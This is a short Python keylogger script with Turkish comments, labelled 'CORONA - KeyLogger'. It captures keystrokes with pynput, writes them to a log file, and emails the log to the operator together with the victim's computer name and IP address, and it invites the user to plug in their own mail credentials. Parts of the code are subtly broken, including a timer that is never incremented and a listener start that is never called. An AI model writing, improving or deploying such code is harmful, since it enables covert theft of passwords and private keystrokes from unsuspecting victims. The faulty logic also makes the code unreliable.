import time, pynput.keyboard, yagmail, socket

tuslar = []
yollamaSuresi = 0
makinaAd = socket.gethostname()
kayitEkle = open("log.txt", "a") 

def klavyeDinle(tus):
    global tuslar
    try:
        tuslar.append(tus)
    except AttributeError:
        if tus == tus.space: 
            tuslar.append(tus)
        else:
            tuslar.append(tus)

def mailYolla(mailAdresiniz, mailParolaniz):
    global tuslar
    kayitEkle.write(str(tuslar))
    mail = yagmail.SMTP(mailAdresiniz, mailParolaniz)
    mail.send(
        to = mailAdresiniz,
        subject = "CORONA - KeyLogger Bildirimi",
        contents = f"""Merhaba Corona Logger kullanıcısı! Az önce bir kullanıcıdan veri aldın.

Kurbanın PC Adı    : > {makinaAd} <
Kurbanın IP Adresi : > {socket.gethostbyname(makinaAd)} <

Log kayıtlarını ekte bulabilirsiniz.""",
        attachments = "log.txt" # Log dosyasının adı.
    )
    tuslar = []

keylogger = pynput.keyboard.Listener(on_press=klavyeDinle)
keylogger.start

with keylogger:
    while True:
        if yollamaSuresi == 5: # 5'i istediğiniz süre ile değiştirin. Örnek; 6 yazarsanız, 6 saniyede bir bildirim alırsınız.
            mailYolla("mail@adresiniz.com", "MailParolanız")
            yollamaSuresi = 0
        else:
            time.sleep(1)
        
